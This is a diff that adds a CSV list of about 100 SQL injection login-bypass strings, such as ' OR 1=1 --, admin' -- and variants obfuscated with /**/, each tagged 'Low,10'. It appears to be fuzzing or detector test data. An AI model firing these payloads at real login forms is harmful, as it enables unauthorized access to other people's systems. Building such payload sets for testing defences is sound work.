@@ -1,0 +1,100 @@
+' OR 1=1 --,Low,10
+' OR 1=1 -- /* test */,Low,10
+' OR 1=1 --,Low,10
+' OR 1=1 -- /* test */,Low,10
+' OR 'a'='a',Low,10
+' OR 'a'='a' /* test */,Low,10
+' OR 'a'='a',Low,10
+' OR 'a'='a',Low,10
+' OR TRUE --,Low,10
+' OR TRUE --,Low,10
+'/**/OR/**/TRUE/**/-- /* test */,Low,10
+' OR TRUE --,Low,10
+admin' --,Low,10
+admin'/**/--,Low,10
+admin' --,Low,10
+admin' --,Low,10
+1' OR '1'='1,Low,10
+1' OR '1'='1,Low,10
+1'/**/OR/**/'1'='1,Low,10
+1'/**/OR/**/'1'='1,Low,10
+' OR 1=1 --,Low,10
+' OR 1=1 --,Low,10
+'/**/OR/**/1=1/**/--,Low,10
+'/**/OR/**/1=1/**/-- /* test */,Low,10
+' OR 'a'='a',Low,10
+'/**/OR/**/'a'='a',Low,10
+' OR 'a'='a',Low,10
+'/**/OR/**/'a'='a',Low,10
+' OR TRUE --,Low,10
+' OR TRUE --,Low,10
+'/**/OR/**/TRUE/**/--,Low,10
+' OR TRUE -- /* test */,Low,10
+admin' --,Low,10
+admin' --,Low,10
+admin' --,Low,10
+admin'/**/--,Low,10
+1' OR '1'='1,Low,10
+1'/**/OR/**/'1'='1,Low,10
+1'/**/OR/**/'1'='1 /* test */,Low,10
+1'/**/OR/**/'1'='1,Low,10
+' OR 1=1 --,Low,10
+'/**/OR/**/1=1/**/--,Low,10
+'/**/OR/**/1=1/**/--,Low,10
+'/**/OR/**/1=1/**/--,Low,10
+' OR 'a'='a',Low,10
+' OR 'a'='a',Low,10
+'/**/OR/**/'a'='a' /* test */,Low,10
+'/**/OR/**/'a'='a' /* test */,Low,10
+' OR TRUE --,Low,10
+'/**/OR/**/TRUE/**/--,Low,10
+' OR TRUE -- /* test */,Low,10
+'/**/OR/**/TRUE/**/--,Low,10
+admin' --,Low,10
+admin'/**/--,Low,10
+admin' -- /* test */,Low,10
+admin'/**/--,Low,10
+1' OR '1'='1,Low,10
+1' OR '1'='1,Low,10
+1' OR '1'='1,Low,10
+1'/**/OR/**/'1'='1 /* test */,Low,10
+' OR 1=1 --,Low,10
+' OR 1=1 --,Low,10
+' OR 1=1 --,Low,10
+' OR 1=1 --,Low,10
+' OR 'a'='a',Low,10
+'/**/OR/**/'a'='a' /* test */,Low,10
+' OR 'a'='a',Low,10
+'/**/OR/**/'a'='a',Low,10
+' OR TRUE --,Low,10
+'/**/OR/**/TRUE/**/--,Low,10
+' OR TRUE --,Low,10
+' OR TRUE --,Low,10
+admin' --,Low,10
+admin' --,Low,10
+admin'/**/--,Low,10
+admin'/**/--,Low,10
+1' OR '1'='1,Low,10
+1'/**/OR/**/'1'='1,Low,10
+1' OR '1'='1,Low,10
+1'/**/OR/**/'1'='1,Low,10
+' OR 1=1 --,Low,10
+'/**/OR/**/1=1/**/--,Low,10
+'/**/OR/**/1=1/**/--,Low,10
+'/**/OR/**/1=1/**/--,Low,10
+' OR 'a'='a',Low,10
+'/**/OR/**/'a'='a',Low,10
+' OR 'a'='a',Low,10
+'/**/OR/**/'a'='a',Low,10
+' OR TRUE --,Low,10
+' OR TRUE -- /* test */,Low,10
+' OR TRUE --,Low,10
+' OR TRUE -- /* test */,Low,10
+admin' --,Low,10
+admin' --,Low,10
+admin'/**/--,Low,10
+' OR 1=1 --,Low,10
+'/**/OR/**/1=1/**/-- /* test */,Low,10
+' OR 1=1 -- /* test */,Low,10
+'/**/OR/**/1=1/**/-- /* test */,Low,10
+' OR 'a'='a',Low,10
